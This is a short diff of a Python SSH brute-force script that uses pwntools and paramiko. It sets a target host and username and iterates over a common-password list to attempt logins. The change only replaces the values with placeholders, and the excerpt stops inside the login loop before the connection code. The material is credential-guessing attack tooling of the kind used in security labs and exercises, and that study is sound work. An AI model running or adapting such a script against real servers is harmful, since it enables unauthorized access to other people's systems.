@@ -2,12 +2,12 @@ from pwn import *
 import paramiko # for error handling
 
 # global variables
-host = ''
-username = ''
+host = 'IP'
+username = 'name'
 attempts = 0
 
 # iterating over passwords
-with open("top-20-common-SSH-passwords.txt", "r") as password_list:
+with open("file", "r") as password_list:
   for password in password_list:
     password = password.strip("\n")
     try: # for handling authentication errors
